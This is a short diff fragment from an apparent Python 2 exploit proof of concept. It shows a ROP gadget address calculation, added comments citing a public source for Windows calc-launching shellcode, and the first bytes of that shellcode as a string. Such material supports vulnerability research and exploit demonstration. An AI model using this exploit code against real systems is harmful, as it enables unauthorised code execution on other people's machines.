@@ -90,6 +90,8 @@ print("First Rop gadget Address: 0x%x"%(base_address + 0x1e2f))
 
 sec = raw_input("Press Enter to continue...")
 
+# shellcode
+# https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html
 
 shell_calc = ""
 shell_calc += "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
